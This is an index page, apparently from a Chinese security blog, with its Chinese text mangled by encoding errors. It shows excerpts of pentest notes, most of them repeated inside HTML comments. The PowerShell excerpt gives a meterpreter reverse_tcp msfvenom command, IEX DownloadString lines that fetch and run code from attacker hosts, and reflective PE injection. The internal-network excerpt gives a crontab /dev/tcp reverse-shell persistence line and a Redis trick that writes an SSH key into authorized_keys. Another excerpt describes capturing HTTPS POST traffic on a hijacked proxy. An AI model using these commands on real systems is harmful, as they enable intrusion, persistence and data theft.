<p>æ ˆæ—¶FILOç»“æ„ï¼Œæ‰€ä»¥æ ˆé¡¶æŒ‡çš„æ˜¯æœ€ä¸‹æ–¹ï¼Œåº•éƒ¨æ˜¯æœ€ä¸Šæ–¹ã€‚</p>
<ul>
<li>%esp æŒ‡å‘æ ˆçš„é¡¶éƒ¨ï¼ˆæ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå­˜æ”¾ä¸€ä¸ªæŒ‡é’ˆï¼Œæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢æ ˆå¸§çš„æ ˆé¡¶)</li>
<li>%ebp æŒ‡å‘æ ˆçš„åº•éƒ¨</li>
<li>%eip ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€</li>
<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
<li>å‡½æ•°æ ˆå¸§ï¼šESPå’ŒEBPä¹‹é—´å†…å­˜ç©ºé—´ä¸ºå½“å‰æ ˆå¸§</li>
</ul>
<p>32ä½x86æ¶æ„ä¸‹çš„é€šç”¨å¯„å­˜å™¨åŒ…æ‹¬ä¸€èˆ¬å¯„å­˜å™¨ï¼ˆeaxã€ebxã€ecxã€edxï¼‰ï¼Œç´¢å¼•å¯„å­˜å™¨ï¼ˆesiã€edi)ï¼Œä»¥åŠå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨(esp,ebp)</p>
<ul>
<li>eax: ç´¯åŠ å¯„å­˜å™¨(Accumulator),ç”¨ä»¥è¿›è¡Œç®—æ•°è¿ç®—å’Œè¿”å›å‡½æ•°ç»“æœç­‰ã€‚</li>
<li>ebx: è¢«ç§°ä¸ºåŸºå€å¯„å­˜å™¨ï¼ˆBaseï¼‰ï¼Œåœ¨å†…å­˜å¯»å€çš„æ—¶å€™ç”¨æ¥å­˜æ”¾åŸºåœ°å€ã€‚</li>
<li>exc: è¢«ç§°ä¸ºè®¡æ•°å¯„å­˜å™¨(Counter)ï¼Œç”¨ä»¥åœ¨å¾ªç¯ä¸­è®¡æ•°ã€‚</li>
<li>edx: è¢«ç§°ä¸ºæ•°æ®å¯„å­˜å™¨(Data)ï¼Œå¸¸é…åˆeaxä¸€èµ·å­˜æ”¾è¿ç®—ç»“æœç­‰æ•°æ®ã€‚</li>
</ul>
<p>æ ˆæ“ä½œï¼ˆåœ¨32ä½ä¸‹)ï¼š</p>
<ul>
<li>pushï¼ˆå‹æ ˆï¼‰ push sth -&gt; [esp]=sth, esp=esp-4</li>
<li>pop ï¼ˆå‡ºæ ˆï¼‰ pop sth -&gt; sth=[esp], esp=esp+4</li>
</ul>
	
	</div>
  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/06/13/powershell-pen.html" >Powershell</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-06-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">åå¼¹123ç«¯å£çš„powershell
msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;


ç«¯å£æ‰«æ:
powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;

è‡ªå®šä¹‰ç«¯å£å’ŒIP
1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;


1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;



powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx

å†…å­˜åŠ è½½è¿è¡Œ:
powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 


ä¸‹è½½æ–‡ä»¶:
(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
</ul>
<p>åœ¨ä½¿ç”¨msfç”Ÿæˆpsçš„payloadçš„æ—¶å€™ï¼Œå¯¹äºç”Ÿæˆçš„æ–‡ä»¶æ ¼å¼æ˜¯hta-pshè§£ç é¡ºåºæ˜¯è¿™æ ·çš„ï¼Œå¯¹äºå…¶ä¸­çš„base64ç¼–ç ï¼Œå…ˆæ­£å¸¸çš„base64è§£ç ï¼Œç„¶åæå–è§£ç ä¹‹åä¸­çš„base64ï¼Œä¿å­˜ä¸º1.txtï¼Œä½¿ç”¨å¦‚ä¸‹è„šæœ¬è§£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt

#&#x2F;usr&#x2F;bin&#x2F;env python
# coding:utf-8

import base64
import gzip
import StringIO
import sys

f &#x3D; sys.argv[1]
with open(f, &quot;rb&quot;) as file:
    data &#x3D; file.read()

decoded&#x3D;base64.b64decode(data)
res &#x3D; StringIO.StringIO(decoded)
for i in gzip.GzipFile(fileobj&#x3D;res):
    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">åå¼¹123ç«¯å£çš„powershell
msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;


ç«¯å£æ‰«æ:
powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;

è‡ªå®šä¹‰ç«¯å£å’ŒIP
1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;


1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;



powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx

å†…å­˜åŠ è½½è¿è¡Œ:
powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 


ä¸‹è½½æ–‡ä»¶:
(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
</ul>
<p>åœ¨ä½¿ç”¨msfç”Ÿæˆpsçš„payloadçš„æ—¶å€™ï¼Œå¯¹äºç”Ÿæˆçš„æ–‡ä»¶æ ¼å¼æ˜¯hta-pshè§£ç é¡ºåºæ˜¯è¿™æ ·çš„ï¼Œå¯¹äºå…¶ä¸­çš„base64ç¼–ç ï¼Œå…ˆæ­£å¸¸çš„base64è§£ç ï¼Œç„¶åæå–è§£ç ä¹‹åä¸­çš„base64ï¼Œä¿å­˜ä¸º1.txtï¼Œä½¿ç”¨å¦‚ä¸‹è„šæœ¬è§£ç :</p>
<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt

#&#x2F;usr&#x2F;bin&#x2F;env python
# coding:utf-8

import base64
import gzip
import StringIO
import sys

f &#x3D; sys.argv[1]
with open(f, &quot;rb&quot;) as file:
    data &#x3D; file.read()

decoded&#x3D;base64.b64decode(data)
res &#x3D; StringIO.StringIO(decoded)
for i in gzip.GzipFile(fileobj&#x3D;res):
    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/06/05/local-network-pentest.html" >å†…ç½‘æ¸—é€æ³¨æ„äº‹é¡¹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-06-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="å†…ç½‘å®šæ—¶åå¼¹"><a href="#å†…ç½‘å®šæ—¶åå¼¹" class="headerlink" title="å†…ç½‘å®šæ—¶åå¼¹:"></a>å†…ç½‘å®šæ—¶åå¼¹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä¸Šé¢åå¼¹ä¹‹åï¼Œåœ¨centosä¸‹é¢ï¼Œå¦‚æœæ²¡æœ‰ç›‘å¬shellçš„æƒ…å†µä¸‹ï¼Œç»ˆç«¯ä¸€ç›´ä¼šæœ‰<code>you have an email in /var/spool/root</code>, è§£å†³æ–¹æ³•å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Rediså†™ç§é’¥"><a href="#Rediså†™ç§é’¥" class="headerlink" title="Rediså†™ç§é’¥"></a>Rediså†™ç§é’¥</h3><p>å¸¸è§„æ“ä½œ:</p>
<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;è·å–å½“å‰çš„ç›®å½•, é»˜è®¤: &#x2F;usr&#x2F;local&#x2F;redis
config get dbfilename &#x2F;&#x2F; è·å–å½“å‰åå­— é»˜è®¤: dump.rdb
config set dir &#x2F;root&#x2F;.ssh
config set dbfilename &quot;authorized_keys&quot;
set xx &quot;\n\n pub_key\n\n&quot;
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¹‹åæ‹¿åˆ°shellï¼Œç„¶åå†æŠŠdirå’Œdbfilenameæ”¹å›æ¥ï¼Œé¡ºä¾¿æŠŠknown_hostsç»™åˆ é™¤æ‰ã€‚</p>
<p>redisæŸ¥çœ‹éƒ¨åˆ†key: </p>
<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="å†…ç½‘å®šæ—¶åå¼¹"><a href="#å†…ç½‘å®šæ—¶åå¼¹" class="headerlink" title="å†…ç½‘å®šæ—¶åå¼¹:"></a>å†…ç½‘å®šæ—¶åå¼¹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>ä¸Šé¢åå¼¹ä¹‹åï¼Œåœ¨centosä¸‹é¢ï¼Œå¦‚æœæ²¡æœ‰ç›‘å¬shellçš„æƒ…å†µä¸‹ï¼Œç»ˆç«¯ä¸€ç›´ä¼šæœ‰<code>you have an email in /var/spool/root</code>, è§£å†³æ–¹æ³•å¦‚ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Rediså†™ç§é’¥"><a href="#Rediså†™ç§é’¥" class="headerlink" title="Rediså†™ç§é’¥"></a>Rediså†™ç§é’¥</h3><p>å¸¸è§„æ“ä½œ:</p>
<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;è·å–å½“å‰çš„ç›®å½•, é»˜è®¤: &#x2F;usr&#x2F;local&#x2F;redis
config get dbfilename &#x2F;&#x2F; è·å–å½“å‰åå­— é»˜è®¤: dump.rdb
config set dir &#x2F;root&#x2F;.ssh
config set dbfilename &quot;authorized_keys&quot;
set xx &quot;\n\n pub_key\n\n&quot;
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¹‹åæ‹¿åˆ°shellï¼Œç„¶åå†æŠŠdirå’Œdbfilenameæ”¹å›æ¥ï¼Œé¡ºä¾¿æŠŠknown_hostsç»™åˆ é™¤æ‰ã€‚</p>
<p>redisæŸ¥çœ‹éƒ¨åˆ†key: </p>
<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/03/02/openresty-https.html" >å¦‚ä½•æˆªå–openrestyåå‘ä»£ç†æœåŠ¡å™¨æ•°æ®åŒ…</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-03-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>æœ‰ä¸€å¤©å°æ˜æ—¥äº†ä¸€å°windowsç‰ˆæœ¬nginxçš„httpsçš„åå‘çš„ä»£ç†æœåŠ¡å™¨ï¼ˆè¿™è¯­å¥ä¸é€šé¡ºï¼‰ã€‚ã€‚</p>
<h3 id="æ”»å‡»èƒŒæ™¯"><a href="#æ”»å‡»èƒŒæ™¯" class="headerlink" title="æ”»å‡»èƒŒæ™¯"></a>æ”»å‡»èƒŒæ™¯</h3><ul>
<li>è·å–httpsåå‘ä»£ç†æœåŠ¡å™¨çš„æ•°æ®è¯·æ±‚æ•°æ® </li>
<li>Windowså¹³å°</li>
</ul>
<h3 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p>ä¸‹è½½openrestyå’Œnginxçš„windowsç‰ˆæœ¬ï¼Œå…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚</p>
<p>å¦‚æœç›´æ¥å¤åˆ¶openrestyé‡Œé¢çš„nginx.exeåˆ°åŸæ±åŸå‘³nginxè§£å‹åŒ…é‡Œé¢ï¼Œæç¤ºç¼ºå°‘dllï¼Œæ²¡æ¯›ç—…ã€‚</p>
<p>æŠŠopenrestyé‡Œé¢çš„nginx.exe libgcc_s_dw2-1.dll lua51.dllï¼Œä¸€èµ·å¤åˆ¶åˆ°çº¯å¤©ç„¶ç‰ˆæœ¬nginxçš„æ–‡ä»¶å¤¹é‡Œé¢ï¼Œå¯åŠ¨nginx.exeã€‚</p>
<p>æŠŠæœ¬åœ°ç¯å¢ƒæ¬åˆ°ç›®æ ‡æœåŠ¡å™¨æµ‹è¯•ä¸‹ï¼Œæ²¡æ¯›ç—…ï¼Œç›®æ ‡ç½‘ç«™çš„åä»£æ­£å¸¸å·¥ä½œï¼Œå”¯ä¸€ä¸æ­£å¸¸çš„å°±æ˜¯httpçš„responseçš„headerå˜æˆäº†openrestyï¼Œå¯ä»¥ä¿®æ”¹openrestyæºä»£ç ã€‚</p>
<h3 id="æˆªå–POSTæ•°æ®åŒ…"><a href="#æˆªå–POSTæ•°æ®åŒ…" class="headerlink" title="æˆªå–POSTæ•°æ®åŒ…"></a>æˆªå–POSTæ•°æ®åŒ…</h3><p>æ ¹æ®Pç¥çš„æ–‡ç« é‡Œé¢:</p>
	

	</div>
  <a type="button" href="/2018/03/02/openresty-https.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>æœ‰ä¸€å¤©å°æ˜æ—¥äº†ä¸€å°windowsç‰ˆæœ¬nginxçš„httpsçš„åå‘çš„ä»£ç†æœåŠ¡å™¨ï¼ˆè¿™è¯­å¥ä¸é€šé¡ºï¼‰ã€‚ã€‚</p>
<h3 id="æ”»å‡»èƒŒæ™¯"><a href="#æ”»å‡»èƒŒæ™¯" class="headerlink" title="æ”»å‡»èƒŒæ™¯"></a>æ”»å‡»èƒŒæ™¯</h3><ul>
<li>è·å–httpsåå‘ä»£ç†æœåŠ¡å™¨çš„æ•°æ®è¯·æ±‚æ•°æ® </li>
<li>Windowså¹³å°</li>
</ul>
<h3 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p>ä¸‹è½½openrestyå’Œnginxçš„windowsç‰ˆæœ¬ï¼Œå…ˆæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚</p>
<p>å¦‚æœç›´æ¥å¤åˆ¶openrestyé‡Œé¢çš„nginx.exeåˆ°åŸæ±åŸå‘³nginxè§£å‹åŒ…é‡Œé¢ï¼Œæç¤ºç¼ºå°‘dllï¼Œæ²¡æ¯›ç—…ã€‚</p>
<p>æŠŠopenrestyé‡Œé¢çš„nginx.exe libgcc_s_dw2-1.dll lua51.dllï¼Œä¸€èµ·å¤åˆ¶åˆ°çº¯å¤©ç„¶ç‰ˆæœ¬nginxçš„æ–‡ä»¶å¤¹é‡Œé¢ï¼Œå¯åŠ¨nginx.exeã€‚</p>
<p>æŠŠæœ¬åœ°ç¯å¢ƒæ¬åˆ°ç›®æ ‡æœåŠ¡å™¨æµ‹è¯•ä¸‹ï¼Œæ²¡æ¯›ç—…ï¼Œç›®æ ‡ç½‘ç«™çš„åä»£æ­£å¸¸å·¥ä½œï¼Œå”¯ä¸€ä¸æ­£å¸¸çš„å°±æ˜¯httpçš„responseçš„headerå˜æˆäº†openrestyï¼Œå¯ä»¥ä¿®æ”¹openrestyæºä»£ç ã€‚</p>
<h3 id="æˆªå–POSTæ•°æ®åŒ…"><a href="#æˆªå–POSTæ•°æ®åŒ…" class="headerlink" title="æˆªå–POSTæ•°æ®åŒ…"></a>æˆªå–POSTæ•°æ®åŒ…</h3><p>æ ¹æ®Pç¥çš„æ–‡ç« é‡Œé¢:</p>
	
	</div>
  <a type="button" href="/2018/03/02/openresty-https.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/02/03/termite-socks.html" >Termiteä»£ç†å·¥å…·</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-02-03  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>ç½‘ä¸Šè®²ewçš„æ–¹æ³•æ¯”è¾ƒå¤šï¼Œå‘¨æœ«çœ‹äº†ä¸‹ä½œè€…çš„è§†é¢‘ï¼Œæ„Ÿè§‰termiteä¹ŸæŒºæœ‰æ„æ€çš„</p>
<p>æ­£å‘socks v5æœåŠ¡å™¨</p>
<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>ä»¥ä¸Šé¢è¿™ä¸ªæ–‡ç« ä½œä¸ºä¾‹å­ï¼Œæ¥è¯´ä¸‹å¯¹åº”çš„è½¬å‘ä¸ä»£ç†</p>
<p>å¦‚æœç›®æ ‡æœ‰ä¸€ä¸ªå¤–ç½‘IPï¼š</p>
<p>ewæ¥è¯´å»ºç«‹socksä»£ç†æœåŠ¡ï¼š</p>
<p><code>ew -s ssocksd -l 8888</code></p>
<p>Termite:</p>
<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
admin_exe -c [tartet_ip] -p 8888
ç„¶ååœ¨admin_exeé‡Œé¢æœ‰ä¸€ä¸ªæ“ä½œç•Œé¢ï¼Œå¯ä»¥ä½¿ç”¨showçœ‹ä¸‹å½“å‰èŠ‚ç‚¹åˆ†å¸ƒï¼Œç„¶åå¦‚ä¸‹æ“ä½œï¼š
goto 1
socks 1080
æ­¤æ—¶VPSä¸Šé¢çš„1080å°±æ¶è®¾äº†ä¸€ä¸ªæœåŠ¡å™¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="åå¼¹socksæœåŠ¡å™¨"><a href="#åå¼¹socksæœåŠ¡å™¨" class="headerlink" title="åå¼¹socksæœåŠ¡å™¨"></a>åå¼¹socksæœåŠ¡å™¨</h2><p>å‡è®¾ç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†æ˜¯å¯ä»¥è®¿é—®å†…ç½‘èµ„æºï¼Œewçš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
	

	</div>
  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>ç½‘ä¸Šè®²ewçš„æ–¹æ³•æ¯”è¾ƒå¤šï¼Œå‘¨æœ«çœ‹äº†ä¸‹ä½œè€…çš„è§†é¢‘ï¼Œæ„Ÿè§‰termiteä¹ŸæŒºæœ‰æ„æ€çš„</p>
<p>æ­£å‘socks v5æœåŠ¡å™¨</p>
<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>ä»¥ä¸Šé¢è¿™ä¸ªæ–‡ç« ä½œä¸ºä¾‹å­ï¼Œæ¥è¯´ä¸‹å¯¹åº”çš„è½¬å‘ä¸ä»£ç†</p>
<p>å¦‚æœç›®æ ‡æœ‰ä¸€ä¸ªå¤–ç½‘IPï¼š</p>
<p>ewæ¥è¯´å»ºç«‹socksä»£ç†æœåŠ¡ï¼š</p>
<p><code>ew -s ssocksd -l 8888</code></p>
<p>Termite:</p>
<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
admin_exe -c [tartet_ip] -p 8888
ç„¶ååœ¨admin_exeé‡Œé¢æœ‰ä¸€ä¸ªæ“ä½œç•Œé¢ï¼Œå¯ä»¥ä½¿ç”¨showçœ‹ä¸‹å½“å‰èŠ‚ç‚¹åˆ†å¸ƒï¼Œç„¶åå¦‚ä¸‹æ“ä½œï¼š
goto 1
socks 1080
æ­¤æ—¶VPSä¸Šé¢çš„1080å°±æ¶è®¾äº†ä¸€ä¸ªæœåŠ¡å™¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="åå¼¹socksæœåŠ¡å™¨"><a href="#åå¼¹socksæœåŠ¡å™¨" class="headerlink" title="åå¼¹socksæœåŠ¡å™¨"></a>åå¼¹socksæœåŠ¡å™¨</h2><p>å‡è®¾ç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPï¼Œä½†æ˜¯å¯ä»¥è®¿é—®å†…ç½‘èµ„æºï¼Œewçš„æ­¥éª¤æ˜¯è¿™æ ·çš„ï¼š</p>
	
	</div>
  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/02/02/xxe.html" >XXEå­¦ä¹ ç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-02-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>XMLåŸºç¡€ï¼š</p>
<p>XMLæ–‡æ¡£ç»“æ„ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">XMLå£°æ˜
&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;

DTDæ–‡æ¡£ç±»å‹å®šä¹‰
&lt;!DOCTYPE note [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;
&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;
]]]


æ–‡æ¡£å…ƒç´ 
&lt;note&gt;
&lt;to&gt;Dave&lt;&#x2F;to&gt;
&lt;from&gt;Tom&lt;&#x2F;from&gt;
&lt;head&gt;Reminder&lt;&#x2F;head&gt;
&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

